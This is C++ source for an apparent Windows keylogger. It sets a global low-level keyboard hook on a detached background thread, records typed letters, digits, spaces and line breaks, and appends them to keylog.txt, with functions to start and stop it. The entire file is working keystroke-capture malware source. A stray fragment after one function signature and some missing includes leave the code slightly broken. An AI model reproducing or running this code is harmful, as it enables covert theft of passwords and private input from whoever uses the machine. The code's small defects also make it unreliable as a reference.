#include "Keylogger.h"
#include <iostream>
#include <string>
#include <vector>

using namespace std;

HHOOK hHook = NULL;

string lineBuffer = "";

void FlushBufferToFile() {
    if (lineBuffer.empty()) return;

    ofstream logFile;
    logFile.open("keylog.txt", ios::app);

    if (logFile.is_open()) {
        logFile << lineBuffer;
        logFile.close();
    }
    lineBuffer = "";
}

void WriteSpecialChar(string s) {
    ofstream logFile;
    logFile.open("keylog.txt", ios::app);
    if (logFile.is_open()) {
        logFile << s;
        logFile.close();
    }
}

LRESULT CALLBACK MyKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD keyCode = kbdStruct->vkCode;

        if (keyCode == VK_RETURN) {
            FlushBufferToFile();
            WriteSpecialChar("\n");
        }
        else if (keyCode == VK_BACK) {
            if (!lineBuffer.empty()) {
                lineBuffer.pop_back();
            }
        }
        else if (keyCode == VK_SPACE) {
            lineBuffer += " ";
        }
        else if ((keyCode >= 0x30 && keyCode <= 0x39) || (keyCode >= 0x41 && keyCode <= 0x5A)) {
            lineBuffer += char(keyCode);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void KeyloggerLoop() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, MyKeyboardProc, NULL, 0);
    if (hHook == NULL) return;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hHook);
}

void StartKeyloggerSystem() {
    std::thread keyloggerThread(KeyloggerLoop);
    keyloggerThread.detach();
}

// Hàm dừng Keylogger
void StopKeyloggerSystem() { đó.
    if (hHook != NULL) {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
        cout << "[STOP] Keylogger unhooked successfully." << endl;
    }
}